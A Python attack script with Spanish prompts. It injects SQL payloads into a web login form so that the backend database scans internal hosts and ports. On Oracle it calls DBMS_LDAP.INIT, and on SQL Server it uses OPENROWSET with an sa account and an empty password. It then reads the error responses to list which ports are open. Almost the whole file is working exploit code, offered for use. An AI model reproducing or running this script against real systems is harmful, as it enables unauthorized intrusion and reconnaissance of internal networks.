import requests
import re

url = input("Ingrese la URL vulnerable => ")
method = input("Ingrese el método HTTP => ")
#payload_address = ("vuln' UNION SELECT UTL_INADDR.get_host_address FROM dual --")
dbms = input("1. Oracle || 2. Sql Server => ")
hosts = ["172.16.3.2","172.16.3.60"]
ports = [21,22,25,53,80,81,82,83,84,88,110,111,135,139,143,211,389,443,445,464,465,587,636,993,995,1028,1042,1052,1433,1521,3389,4998,5800,5900,8080]

if dbms == '1':
    print('   IP     /  PUERTO')
    for host in hosts:
        for port in ports:
            payload_ldap = (f"vuln' UNION SELECT TO_CHAR(RAWTOHEX(DBMS_LDAP.INIT('{host}',{port}))) FROM DUAL --")
            r = requests.request(method, url, data={"username": payload_ldap, "password": "cualquiercosa"})
            output = r.text.strip()
            if r.status_code == 200:
                indice = output.find(", ")
                indice2 = output.find("<form")
                resultado = output[indice:indice2]
                if "Warning" not in resultado:
                    print(host, port)
            else:
                print("ERROR! Inténtelo de nuevo.")
else:
    print('   IP     /  PUERTO')
    for host in hosts:
        for port in ports:
            payload_DBMSSOCN = (f"vuln' union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address={host},{port};timeout=5', 'select * from table') --")
            r = requests.request(method, url, data={"usuario": payload_DBMSSOCN, "contrasena": "cualquiercosa"})
            #time.sleep(6)
            output = r.text.strip()
            if r.status_code == 200:
                indice = output.find("TCP Provider: Se ha forzado la interrupci")
                if indice > 0:
                    print(host, port)
            else:
                print("ERROR! Intentelo de nuevo.")